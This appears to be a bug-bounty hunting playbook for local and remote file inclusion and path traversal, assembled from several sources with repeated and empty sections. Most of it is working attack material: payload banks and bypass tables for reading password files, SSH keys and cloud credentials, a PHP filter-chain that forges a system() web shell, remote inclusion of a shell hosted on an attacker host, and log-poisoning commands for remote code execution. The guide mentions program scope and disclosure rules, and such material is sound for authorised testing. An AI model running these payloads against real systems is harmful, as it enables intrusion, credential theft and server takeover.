- Detection workflow: use a unique, fingerprintable target (`^root:x:0:0:` in `/etc/passwd`) and request a known-missing sibling (`/etc/passwd_<rand>`) as the control. For blind cases, sub-tag Collaborator payloads per sink.

### Named CVEs / Public Techniques (grounding)

Verified, correctly-attributed references for the patterns above:
- **PHP filter-chain to RCE** — Synacktiv research (2022); `php_filter_chain_generator`. Not a CVE; an abuse of documented `iconv` behaviour. The reason a bare file-read upgrades to Critical.
- **CVE-2021-41773** — Apache HTTP Server 2.4.49 path traversal (`%2e` in normalized path) → file read, and RCE when `mod_cgi` is enabled.
- **CVE-2021-42013** — Apache HTTP Server 2.4.50 incomplete fix for the above (double-encoded `%%32%65`) → traversal/RCE.
- **CVE-2024-4577** — PHP-CGI argument injection on Windows (Best-Fit encoding); reachable on XAMPP-style stacks, chains from file-serve to RCE.

> Grounding note: this skill is built from 31 disclosed LFI/path-traversal reports. When citing a specific HackerOne report in your write-up, link the exact report URL/ID you used — do **not** paraphrase a report ID from memory. A wrong ID is worse than none.

---

### Bypass Table

| Filter | Bypass |
|--------|--------|
| Strips `../` once | `....//` or `..../\` (re-forms `../` after strip) |
| URL-decodes once | `%252f` (double-encode `/`), `%252e` for dots |
| Decodes once, blocks `..` | Encode dots: `%2e%2e%2f` / overlong `%c0%ae` (legacy) |
| Appends `.php` to input | `?` or `#` truncation; null byte `%00` (PHP < 5.3.4) |
| Blocks `php://` scheme | try `PHP://`, `pHp://`, or `data://` / `expect://` |
| Prepends fixed base dir | enough `../` to escape; or absolute path if no base prepend |
| Blocks `/etc/passwd` literal | path-truncation, `/etc/./passwd`, `/etc//passwd` |
| WAF on long filter-chains | move chain to POST body / minimize payload |
| Windows | `..\..\..\windows\win.ini`, `..%5c..%5c` |

---

### Validation and proof

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

# HUNT-LFI — Local / Remote File Inclusion & Path Traversal

### OOB / Blind-LFI Confirmation Gate (Read First)

LFI is frequently **blind**: the included content is parsed/executed but never reflected, or the page swallows the file into a template you can't see. Do **not** claim LFI from indirect signals alone.

### What is NOT confirmation

- A different status code or error string for `../../etc/passwd` vs a normal value. The app may be string-matching `../` and returning a canned 403/500 without ever touching the filesystem.
- Your input **echoed back** inside an error message (e.g. `failed to open '/var/www/../../etc/passwd'`). That is the path *formatter*, not proof the file was read. A genuine read shows file **contents**, not your path.
- A page that "looks different." Reflected-input or WAF block pages produce diffs unrelated to a real read.

### What IS confirmation

- **Direct read:** actual file *contents* appear (real `root:x:0:0:` line, real PHP source after base64-decoding the filter output).
- **Blind read via OOB exfil:** use a php://filter or XXE-style chain whose payload performs a DNS/HTTP callback to your **Burp Collaborator** subdomain, or use an `expect://` / wrapper that triggers an outbound request. A unique-per-sink Collaborator hit (DNS + HTTP, with the server's source IP) proves the include ran.
- **Blind read via differential/timing:** include a file you *know* exists and is large (`/etc/passwd`) vs one that does not (`/etc/passwd_nope_<rand>`). Stable, repeatable response-length or latency delta = real filesystem access. Confirm with a third known-good path to rule out coincidence.

### Validation Discipline

**Direct-read proof (not a false positive):**
- Show real *contents*, not your echoed path. `/etc/passwd` must contain a literal `root:x:0:0:root:/root:` line. Diff the response against a known-good param value — the delta must be the file body, not a WAF/error page.
- For source reads, the **base64 must decode to valid PHP**. A garbage/empty decode = no real read.
- Rule out reflection: confirm the marker text is not simply your input bounced back. Request `/etc/passwd` and `/etc/passwd_<rand>` (non-existent) — only the real file returns content.

**Blind / OOB proof:**
- No reflection? Use a php://filter-chain or RFI payload that calls back to a **unique Burp Collaborator subdomain**. Require a DNS + HTTP hit with the server's source IP before claiming the include executed. Sub-tag per sink.
- Timing/length blind: triple-confirm a stable delta (known-large file vs missing file vs second known file). One-off deltas are noise — retract.

**Partial / truncated reads:**
- Templating may HTML-escape or cut the file. Use `php://filter/convert.base64-encode` so even a truncated read decodes to recognizable bytes; report exactly what you recovered, not what you assume is there.

**RCE proof:** show command output you control — `id` / `whoami` / `hostname` reflected, or an OOB callback from inside the executed payload (`curl http://<collab>/`). "The payload was accepted" is not RCE.

**Severity:**
- Non-sensitive file read: **Medium**
- File read exposing DB creds / API keys / private keys / cloud creds: **High**
- RCE via filter-chain / RFI / log / session / phar / CVE: **Critical**

---

### C. Validation / proof bar — how to confirm and avoid false positives

- Real confirmation is file **contents**, not your echoed path. `failed to open '/var/www/../../etc/passwd'` is the path formatter, not a read.
- A lone status-code or error-string difference is not proof — the app may be string-matching `../` and returning a canned 403/500 without touching the filesystem.
- Diff the response against a known-good parameter value; the delta must be the file body, not a WAF/error page.
- For source reads, the base64 must decode to valid PHP/source — a garbage or empty decode means no read occurred.
- Blind reads require a unique Collaborator DNS+HTTP hit with the server's source IP, or a triple-confirmed stable length/latency delta (large existing file vs missing file vs second known file). One-off deltas are noise.
- Rule out reflection: request `/etc/passwd` and `/etc/passwd_<rand>`; only the real file returns content.
- A blank response from `file://` often means the file contained `<`, `>`, or `&` and broke the parse — use a base64 filter or a different file before concluding the file is unreadable.
- Partial/truncated reads are still valid — report exactly what was recovered, using base64 so truncated output still decodes to recognisable bytes.
- RCE proof (filter-chain/RFI/log/session/phar/CVE) requires command output you control (`id`/`whoami`) or an OOB callback from inside the executed payload. "Payload accepted" is not RCE.
- Severity: non-sensitive file read → Medium; secrets/keys/cloud creds → High; RCE via filter-chain/RFI/poisoning/CVE → Critical.

**Encoding bypass matrix (PortSwigger / OWASP canonical list):**
- `../` → `..%2f`, `%2e%2e/`, `%2e%2e%2f`, `..%5c` (Windows), `%2e%2e%5c`.
- Double-encoded: `%252e%252e%252f`, `..%255c`.
- Overlong UTF-8: `..%c0%af`, `..%c1%9c`.
- Backslash as separator: `..\`, `..%5c`, `..\\`, and mixed `....\/`.
- Nested single-pass strip: `....//` reverts to `../` when the inner `../` is removed once.
- Null byte for extension checks: `%00.png` appended after the target path.

**Sensitive-file hit list by platform:**
- Linux: `/etc/passwd`, `/etc/hosts`, `/etc/shadow` (rarely readable), `/proc/self/environ`, `/proc/self/cmdline`, `/var/www/html/.env`, `wp-config.php`, `~/.aws/credentials`, `/run/secrets/*`, `.git/config`.
- Windows: `C:\Windows\win.ini`, `C:\inetpub\wwwroot\web.config`, `..\..\web.config`, `C:\Windows\System32\inetsrv\config\applicationHost.config`.
- Java: `WEB-INF/web.xml`, `WEB-INF/classes/application.properties`, `.war`/`.jar` contents.
- Python: `settings.py`, `SECRET_KEY`, `/proc/self/environ`.
- Node: `.env`, `package.json`, `dist/` source maps.

**Common reasons a traversal payload fails:**
- The app prepends a base directory and canonicalises — try an absolute path or include the base prefix followed by `../`.
- The parameter is length-capped or the sink rejects long payloads — use a short absolute path.
- The extension check requires `.png`/`.jpg` — append `%00.png` or a `?`/`#` truncation.
- The front-end normalises the path before sending — use `--path-as-is` in curl or edit the raw request in Burp; encode the dots as `%2e`.
- The framework decodes differently from the WAF — double-encode or use non-standard Unicode separators.
- The file exists but is unreadable by the service account — switch to a world-readable target such as `/etc/hostname`.

### Validation Discipline

**Direct-read proof (not a false positive):**
- Show real *contents*, not your echoed path. `/etc/passwd` must contain a literal `root:x:0:0:root:/root:` line. Diff the response against a known-good param value — the delta must be the file body, not a WAF/error page.
- For source reads, the **base64 must decode to valid PHP**. A garbage/empty decode = no real read.
- Rule out reflection: confirm the marker text is not simply your input bounced back. Request `/etc/passwd` and `/etc/passwd_<rand>` (non-existent) — only the real file returns content.

**Blind / OOB proof:**
- No reflection? Use a php://filter-chain or RFI payload that calls back to a **unique Burp Collaborator subdomain**. Require a DNS + HTTP hit with the server's source IP before claiming the include executed. Sub-tag per sink.
- Timing/length blind: triple-confirm a stable delta (known-large file vs missing file vs second known file). One-off deltas are noise — retract.

**Partial / truncated reads:**
- Templating may HTML-escape or cut the file. Use `php://filter/convert.base64-encode` so even a truncated read decodes to recognizable bytes; report exactly what you recovered, not what you assume is there.

**RCE proof:** show command output you control — `id` / `whoami` / `hostname` reflected, or an OOB callback from inside the executed payload (`curl http://<collab>/`). "The payload was accepted" is not RCE.

**Severity:**
- Non-sensitive file read: **Medium**
- File read exposing DB creds / API keys / private keys / cloud creds: **High**
- RCE via filter-chain / RFI / log / session / phar / CVE: **Critical**

### Escalation and related chains

### Escalation chains

- LFI -> log poisoning -> RCE.
- Arbitrary file read -> secrets -> ATO.
- Zip slip -> webshell.

### Phase 4 — PHP Filter-Chain → RCE (no upload, no writable file)

The modern flagship technique (Synacktiv, 2022). If you have a `php://`-capable LFI that *reads* a file, you can also *execute* attacker-chosen PHP. `iconv` charset conversions, chained inside `php://filter`, emit controlled bytes that prepend to the resource until a full `<?php ... ?>` payload is forged — then `include()` runs it. **No upload endpoint, no log access, no writable path required.**

```bash
# Generate the chain (public tool, no CVE — it abuses documented iconv behaviour):
#   git clone https://github.com/synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
# Tool prints a long php://filter|convert.iconv.*|...|resource=php://temp string.
# Drop it into the sink:
?file=php://filter/convert.iconv.UTF8.CSISO2022KR|...<long-chain>...|convert.base64-decode/resource=php://temp&c=id
```
Notes / gotchas:
- Requires the include sink to accept the `php://filter` scheme (most LFI sinks calling `include`/`require`/`file_get_contents` on the param do).
- Payloads get **long** (10–50KB). If the param is length-capped or WAF-blocked on size, move it to a POST body, or use a minimal payload (`<?=`shorthand`?>`).
- For blind targets, set the chain payload to a Collaborator callback (`<?php file_get_contents("http://x.<collab>/".`id`);?>`) to confirm execution OOB.
- This works even when log poisoning fails (unreadable logs, `open_basedir`). Try it whenever you have a php:// filter read.

### Chain Table

| LFI primitive | Chain to | Impact |
|---------------|----------|--------|
| `php://filter` read | **filter-chain RCE (Phase 4)** | RCE with no upload — **Critical** |
| File read | `.env` / `config.php` / `wp-config.php` | DB creds, API keys → backend takeover |
| File read | `/proc/self/environ`, `~/.aws/credentials` | env secrets, cloud keys → SSRF/IAM pivot |
| Remote URL include | RFI (`allow_url_include`) | direct RCE — **Critical** |
| File read + upload | phar:// / log / session poison | RCE — **Critical** |
| Source disclosure | full app source | hardcoded secrets, new sinks, machineKey |

---

### Tools and wordlists

### Tools

`ffuf` · `Burp` · `dotdotpwn` · `nuclei`

### Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_path-traversal.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/params_path-traversal.txt` | 79 |
| `~/.local/share/hackerone-reports/wordlists/payloads_path-traversal.txt` | 59 |
| `~/.local/share/hackerone-reports/wordlists/payloads_path-traversal_waf.txt` | 12 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_path-traversal.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_path-traversal.txt \
     -mr 'canary|error|invalid|not found' -rate 40
ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_path-traversal.txt \
     -mr '<hit-marker>' -rate 20
```

### Nuclei

Point the LFI fuzzers at file/download/export parameters.

```sh
nuclei -u https://target -tags lfi,traversal,path-traversal \
       -severity low,medium,high,critical -rl 40 -o nuclei_path-traversal.txt
nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/lfi -dast \
       -rl 40 -o nuclei_path-traversal_lfi.txt
nuclei -u https://target -t ~/nuclei-templates/http/fuzzing/linux-lfi-fuzzing.yaml \
       -rl 40 -o nuclei_path-traversal_linux-lfi-fuzzing.txt
nuclei -u https://target -t ~/nuclei-templates/http/fuzzing/windows-lfi-fuzzing.yaml \
       -rl 40 -o nuclei_path-traversal_windows-lfi-fuzzing.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

### Sources and related reading

### Query the corpus

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class path-traversal --limit 20
python3 ~/.local/share/hackerone-reports/h1.py stats --class path-traversal
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```

Search by technology, endpoint, parameter, or program. Examples:

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class path-traversal
python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class path-traversal --min-bounty 1000
```

### Related

- `hackerone-rce` (1,399 reports)
- `hackerone-file-upload` (100 reports)
- `hackerone-info-disclosure` (1,827 reports)

### Related

- `rce` (1,399 reports)
- `file-upload` (100 reports)
- `info-disclosure` (1,827 reports)

### Phase 3 — PHP Wrappers (source disclosure)

```bash
?file=php://filter/convert.base64-encode/resource=index.php   # decode base64 → source
?file=php://filter/read=string.rot13/resource=config.php
?file=php://filter/convert.base64-encode/resource=../app/Config.php
# Always base64-encode source reads: raw <?php ... ?> is parsed/swallowed and you see nothing.
```

### D. Sources — numbered list of URLs you actually fetched

1. https://portswigger.net/web-security/file-path-traversal
2. https://github.com/h3js/h3/security/advisories/GHSA-wr4h-v87w-p3r7

### Additional notes

### Basic traversal

```text
../../../../etc/passwd
../../../../../../etc/passwd
../../../../etc/shadow
../../../../etc/hosts
../../../../proc/self/environ
../../../../proc/self/cmdline
../../../../var/log/apache2/access.log
../../../../var/log/nginx/access.log
../../../../home/user/.ssh/id_rsa
..\..\..\..\windows\win.ini
..\..\..\..\boot.ini
..\..\..\..\windows\system32\drivers\etc\hosts
```

### Encoded traversal

```text
..%2f..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252f..%252fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
..%5c..%5c..%5c..%5cwindows/win.ini
%252e%252e%252f%252e%252e%252fetc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
..%e0%80%af..%e0%80%afetc/passwd
..%ef%bc%8f..%ef%bc%8fetc/passwd
%2e%2e%5c%2e%2e%5cwindows%5cwin.ini
..%2F..%2F..%2Fetc%2Fpasswd%00.png
```

### Wrappers & absolute paths

```text
file:///etc/passwd
file:///c:/windows/win.ini
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=../../etc/passwd
php://filter/convert.base64-encode/resource=../config.php
phar://upload.phar/index.php
zip://upload.zip%23shell.php
data://text/plain,<?php system('id'); ?>
/etc/passwd
/proc/self/environ
C:\windows\win.ini
\\127.0.0.1\c$\windows\win.ini
```

### LFI to RCE

```text
/var/log/apache2/access.log
/var/log/nginx/access.log
/proc/self/fd/0
/proc/self/fd/1
/proc/self/fd/2
/tmp/sess_<PHPSESSID>
/var/lib/php/sessions/sess_<PHPSESSID>
/var/log/auth.log
/var/log/mail.log
..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log
..%2f..%2f..%2f..%2fproc%2fself%2fenviron
..%2f..%2f..%2f..%2fproc%2fself%2ffd%2f0
```

Copyable lists:
- `~/.local/share/hackerone-reports/wordlists/payloads_path-traversal.txt` (59)
- `~/.local/share/hackerone-reports/wordlists/payloads_path-traversal_waf.txt` (12 filter/WAF-focused)

### Parameters observed

`type` · `textdomain` · `lang` · `YEAR` · `path` · `DIR` · `name` · `SIZE` · `STYLE` · `TYPE` · `ACTIVES` · `AGE` · `DISPLAY` · `PHOT` · `SUB_PROD` · `NAV` · `YR` · `ARCHIVE` · `MO` · `PROD`

### Arbitrary file read via the UploadsRewriter when moving and issue

`#827052` · GitLab · $20,000 · critical · 2020-04-27 · ▲1503
> The UploadsRewriter does not validate the file name, allowing arbitrary files to be copied via directory traversal when moving an issue to a new project. The pattern used to look for references is : This is used by the UploadsRewriter when copying an issue to also copy across the files: As there is no restriction on what file can be, path traversal can be used to copy any file. Demo {F757226}

### [CVE-2022-44268] Arbitrary Remote Leak via ImageMagick

`#1858574` · HackerOne · $0 · critical · 2023-03-16 · ▲371
> Summary: HackerOne's image upload is using ImageMagick to convert/resize images and is likely updated. Thus, it's vulnerable to CVE-2022-44268. Description: Steps To Reproduce 1. Navigate to your profile 2. Edit and upload the attached image (im-lfi.png) as your profile picture 3. Save changes and download the resized picture 4.

### Arbitrary file read  via the bulk imports UploadsPipeline

`#1439593` · GitLab · $29,000 · critical · 2022-03-21 · ▲329
> The bulk imports api does not remove symlinks when untaring the uploads.tar.gz file, allowing arbitrary files to be read and uploaded when importing a group. When a group has uploads (such as markdown attachments), an uploads.tar.gz file will be downloaded and extracted in the UploadsPipeline: https://gitlab.com/gitlab-org/gitlab/-/blob/v14.6.0-ee/lib/bulk imports/common/pipelines/uploads pipeline.rb L15 Since untar zxf only changes the permissions, any…

### Misuse of an authentication cookie combined with a path traversal on app.starbucks.com permitted access to restricted data

`#876295` · Starbucks · $0 · critical · 2020-06-16 · ▲239
> zlz and rhynorater discovered that by obtaining a valid authentication cookie and then combining that with a path traversal, this allowed access to restricted data. noapearson assisted by providing additional information post discovery. @zlz / @rhynorater / @noapearson — thank you for reporting this vulnerability and for confirming the resolution.

### Arbitrary file read during project import

`#1132378` · GitLab · $16,000 · critical · 2021-05-24 · ▲194
> A mis-usage of json schema validator could be used by an attacker to read any file in GitLab server. The issue allows the attacker to leak ~250 bytes of data of any file. At the same time, as the root cause of the issue here is 'open-uri'. It's an SSRF issue at the same time.

### Default workflow

1. Pick a **unique marker** target: prefer a file whose content you can fingerprint exactly (`/etc/passwd` → grep `^root:`). For blind, use a php://filter base64 read and decode — partial/truncated base64 still decodes to recognizable source.
2. Generate a sub-tagged Collaborator payload per sink (`lfi-page.<collab>`, `lfi-tpl.<collab>`) so callbacks identify which parameter fired.
3. Send, wait 30–120s, poll OOB.
4. Claim LFI **only** after a content match, a Collaborator callback, or a stable triple-confirmed timing/length delta. Echoed paths and lone status-code changes are retracted.

---

### URL / Body Parameters

```
?page=  ?file=  ?path=  ?template=  ?view=  ?lang=  ?module=
?include=  ?doc=  ?load=  ?read=  ?content=  ?theme=  ?layout=
?component=  ?download=  ?img=  ?pdf=  ?report=  ?style=  ?dir=
JSON bodies: {"filename":...} {"template":...} {"path":...}
```

### Phase 1 — Identify Candidates

```bash
cat recon/$TARGET/urls.txt | gf lfi > recon/$TARGET/lfi-candidates.txt
grep -E "(\?|&)(page|file|path|template|view|lang|module|include|doc|load|read|content|download|img|pdf|report|dir)=" \
  recon/$TARGET/urls.txt
ffuf -u "https://$TARGET/FUZZ" -w ~/wordlists/lfi-paths.txt -mc 200,301,302
```

### Phase 2 — Path Traversal (read)

```bash
?file=../../../etc/passwd
?file=....//....//....//etc/passwd            # ../ stripping once → ....// survives
?file=..%2f..%2f..%2fetc%2fpasswd             # single URL-encode
?file=..%252f..%252f..%252fetc%252fpasswd     # double encode (decoded twice server-side)
?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd          # encode dots too
?file=/etc/passwd%00.png                      # null byte — PHP < 5.3.4 only
?file=....\/....\/etc\/passwd                  # mixed slash
# Prefix-forced base (app prepends /var/www/): pad with extra ../, or absolute path if no prefix
# UTF-8 overlong: %c0%ae%c0%ae%2f  (legacy servers)
```
```bash
# Windows
?file=..\..\..\windows\win.ini
?file=..%5c..%5c..%5cwindows%5cwin.ini
?file=C:\inetpub\wwwroot\web.config
```

### Phase 5 — Code-Execution Wrappers (config prerequisites)

```bash
# data:// — executes inline; REQUIRES allow_url_include=On
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id   # <?php system($_GET['c']);?>

# php://input — body is treated as the included resource; ALSO REQUIRES allow_url_include=On
#   POST ?file=php://input    body: <?php system($_GET['c']); ?>
#   (Same prerequisite as data://. Do NOT assume this works on default PHP config.)

# expect:// — direct command exec; requires the (rare) expect extension loaded
?file=expect://id
```

### Phase 6 — Remote File Inclusion (RFI)

RFI = the include target is a **remote URL**. Prerequisite: `allow_url_include=On` (and `allow_url_fopen=On`). Off by default on modern PHP, but still seen on legacy/misconfigured hosts.
```bash
# Host a payload you control, then:
?file=http://OOB-HOST/shell.txt          # shell.txt contains <?php system($_GET['c']); ?>
?file=https://OOB-HOST/shell.txt?
?file=ftp://OOB-HOST/shell.txt
# Detection without RCE: point at a Burp Collaborator HTTP URL. A callback (server IP) = the
# include fetched remotely → RFI confirmed even if execution is blocked. No callback = not RFI.
# Bypass appended extension (?file=$x.".php"): trailing ? or # to truncate, or ?file=http://OOB/shell
```

### Phase 7 — Log Poisoning → RCE

```bash
# Step 1: inject PHP into a log the include can read
curl -s "https://$TARGET/" -H "User-Agent: <?php system(\$_GET['c']); ?>"
# Step 2: include it (verify the log is readable first — read it plain before poisoning)
?file=../../../var/log/apache2/access.log&c=id
?file=../../../var/log/nginx/access.log&c=id
?file=/proc/self/fd/0&c=id                  # stdin fd (varies)
# Candidate logs: /var/log/apache2/access.log /var/log/httpd/access_log
#   /var/log/nginx/access.log /var/log/auth.log (SSH user poisoning) /proc/self/environ
```

### Phase 8 — Session / Upload Poisoning

```bash
# PHP session: set payload in a stored field (username/profile), then include the session file
?file=/var/lib/php/sessions/sess_<PHPSESSID>&c=id
?file=/tmp/sess_<PHPSESSID>&c=id
# phar:// object injection (needs an unserialize-on-metadata sink + any file upload):
?file=phar:///var/www/uploads/evil.jpg     # JPEG magic bytes prepended to a PHAR
# zip:// — archive containing the target, or a symlink to /etc/passwd
?file=zip:///var/www/uploads/a.zip%23path/inside.txt
```

### Phase 8b — Archive-extraction & image-processing sinks (no `?file=` needed)

Two LFI/traversal surfaces that are not query-parameter file reads:
- **Zip Slip / tar-symlink escape** — a server that untars/unzips a user-supplied archive follows `../../` entry names or embedded symlinks (tar preserves them) to read/write outside the extraction dir. Craft an archive entry named `../../../etc/cron.d/x`, or a symlink pointing at `/etc/passwd`; confirm by writing a unique canary outside the upload dir. Disclosed: reports/1439593, reports/733072, reports/822262.
- **ImageMagick coder read-sink** — image convert/thumbnail/avatar features read local files via MSL/MVG coders even with no file parameter: filename/label `label:@/etc/passwd`, or an MSL payload (`<image xlink:href="msl:/etc/passwd">`) plus `msl:`/`ephemeral:` pseudo-protocols (ImageTragick CVE-2016-3714 family). Disclosed: reports/1858574. Pairs with `file-upload`.

### Phase 9 — Automation (then manual-confirm everything)

```bash
ffuf -u "https://$TARGET/page.php?file=FUZZ" -w ~/wordlists/lfi.txt -mc all -fr "not found"
wfuzz -c -z file,/usr/share/wfuzz/wordlist/vulns/lfi.txt --hh <baseline-len> \
  "https://$TARGET/page.php?file=FUZZ"
dotdotpwn -m http -h $TARGET -o unix
# Burp: Intruder over the bypass table; Collaborator for blind/RFI confirmation.
```

---

### Sensitive Files to Read

```
# Linux
/etc/passwd  /etc/hosts  /etc/shadow (rarely readable)
/proc/self/environ  /proc/self/cmdline  /proc/self/status
/var/www/html/.env  /var/www/html/config.php  /var/www/html/wp-config.php
/home/*/.ssh/id_rsa  /root/.ssh/id_rsa  /root/.bash_history
/var/www/html/app/config/parameters.yml   # Symfony
.git/config  .git/HEAD  composer.json  package.json
# App / cloud secrets
/proc/self/environ  ~/.aws/credentials  ~/.docker/config.json  /run/secrets/*
# Windows / .NET
C:\Windows\win.ini  C:\inetpub\wwwroot\web.config  ..\..\web.config
C:\Windows\System32\inetsrv\config\applicationHost.config
```

---

### Phase 8b — Archive-extraction & image-processing sinks (no `?file=` needed)

Two LFI/traversal surfaces that are not query-parameter file reads:
- **Zip Slip / tar-symlink escape** — a server that untars/unzips a user-supplied archive follows `../../` entry names or embedded symlinks (tar preserves them) to read/write outside the extraction dir. Craft an archive entry named `../../../etc/cron.d/x`, or a symlink pointing at `/etc/passwd`; confirm by writing a unique canary outside the upload dir. Disclosed: reports/1439593, reports/733072, reports/822262.
- **ImageMagick coder read-sink** — image convert/thumbnail/avatar features read local files via MSL/MVG coders even with no file parameter: filename/label `label:@/etc/passwd`, or an MSL payload (`<image xlink:href="msl:/etc/passwd">`) plus `msl:`/`ephemeral:` pseudo-protocols (ImageTragick CVE-2016-3714 family). Disclosed: reports/1858574. Pairs with `hunt-file-upload`.

## Companion methodology (complete, deduplicated)

Full text of every non-SKILL.md methodology document from the contributing skills.

### Companion: hunting / references/payloads.md

# Path Traversal — Combined Field Guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- `../../../../etc/passwd` `..%2f..%2f..%2fetc/passwd` `%2e%2e%2f%2e%2e%2f`

- `....//....//etc/passwd` `..\..\..\windows\win.ini` `..%c0%af..%c0%af`

- `/etc/passwd%00.png` `file:///etc/passwd` `php://filter/convert.base64-encode/resource=index`

- Zip slip -> `../../../../var/www/shell.php` in archive entry name



## Payload bank



**59 curated payloads** in 5 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.



### Basic traversal



```text

../../../../etc/passwd

../../../../../../etc/passwd

../../../../etc/shadow

../../../../etc/hosts

../../../../proc/self/environ

../../../../proc/self/cmdline

../../../../var/log/apache2/access.log

../../../../var/log/nginx/access.log

../../../../home/user/.ssh/id_rsa

..\..\..\..\windows\win.ini

..\..\..\..\boot.ini

..\..\..\..\windows\system32\drivers\etc\hosts

```



### Encoded traversal



```text

..%2f..%2f..%2f..%2fetc/passwd

..%252f..%252f..%252f..%252fetc/passwd

%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd

%2e%2e/%2e%2e/%2e%2e/etc/passwd

..%5c..%5c..%5c..%5cwindows/win.ini

%252e%252e%252f%252e%252e%252fetc/passwd

..%c0%af..%c0%af..%c0%afetc/passwd

..%e0%80%af..%e0%80%afetc/passwd

..%ef%bc%8f..%ef%bc%8fetc/passwd

%2e%2e%5c%2e%2e%5cwindows%5cwin.ini

..%2F..%2F..%2Fetc%2Fpasswd%00.png

```



### Filter bypass



```text

....//....//....//etc/passwd

....\....\....\windows\win.ini

..././..././..././etc/passwd

..;/..;/..;/etc/passwd

..%00/..%00/..%00/etc/passwd

/etc/passwd%00.png

/etc/passwd%00.jpg

....//....//....//....//etc/passwd

..%2f..%2f..%2f..%2f..%2fetc/passwd

..%252f..%252f..%252fetc%252fpasswd

..//..//..//etc/passwd

..%5c..%5c..%5cwindows%5cwin.ini

```



### Wrappers & absolute paths



```text

file:///etc/passwd

file:///c:/windows/win.ini

php://filter/convert.base64-encode/resource=index.php

php://filter/read=convert.base64-encode/resource=../../etc/passwd

php://filter/convert.base64-encode/resource=../config.php

phar://upload.phar/index.php

zip://upload.zip%23shell.php

data://text/plain,<?php system('id'); ?>

/etc/passwd

/proc/self/environ

C:\windows\win.ini

\\127.0.0.1\c$\windows\win.ini

```



### LFI to RCE



```text

/var/log/apache2/access.log

/var/log/nginx/access.log

/proc/self/fd/0

/proc/self/fd/1

/proc/self/fd/2

/tmp/sess_<PHPSESSID>

/var/lib/php/sessions/sess_<PHPSESSID>

/var/log/auth.log

/var/log/mail.log

..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log

..%2f..%2f..%2f..%2fproc%2fself%2fenviron

..%2f..%2f..%2f..%2fproc%2fself%2ffd%2f0

```



Copyable lists:

- `~/.local/share/hackerone-reports/wordlists/payloads_path-traversal.txt` (59)

- `~/.local/share/hackerone-reports/wordlists/payloads_path-traversal_waf.txt` (12 filter/WAF-focused)



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 26× | `../` |

| 8× | `path.resolve()` |

| 6× | `path.join()` |

| 6× | `$backup_sizes` |

| 6× | `finalize_item()` |

| 6× | `/../` |

| 6× | `%2f%2e%2e%2f` |

| 5× | `wp_delete_attachment_files()` |

| 5× | `$meta['file']` |

| 5× | `dedotdotify()` |

| 5× | `$id` |

| 4× | `Buffer.from()` |

| 4× | `Curl_urldecode()` |

| 4× | `ctxt->root` |

| 4× | `openat()` |

| 4× | `%2f` |

| 4× | `to a chosen directory (in this case,` |

| 4× | `<server-IP>` |

| 3× | `$to` |

| 3× | `.attach()` |



## Parameters observed



`type` · `textdomain` · `lang` · `YEAR` · `path` · `DIR` · `name` · `SIZE` · `STYLE` · `TYPE` · `ACTIVES` · `AGE` · `DISPLAY` · `PHOT` · `SUB_PROD` · `NAV` · `YR` · `ARCHIVE` · `MO` · `PROD`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_path-traversal.txt` | 150 |

| `~/.local/share/hackerone-reports/wordlists/params_path-traversal.txt` | 79 |

| `~/.local/share/hackerone-reports/wordlists/payloads_path-traversal.txt` | 59 |

| `~/.local/share/hackerone-reports/wordlists/payloads_path-traversal_waf.txt` | 12 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_path-traversal.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_path-traversal.txt \

     -mr 'canary|error|invalid|not found' -rate 40

ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_path-traversal.txt \

     -mr '<hit-marker>' -rate 20

```



## Nuclei



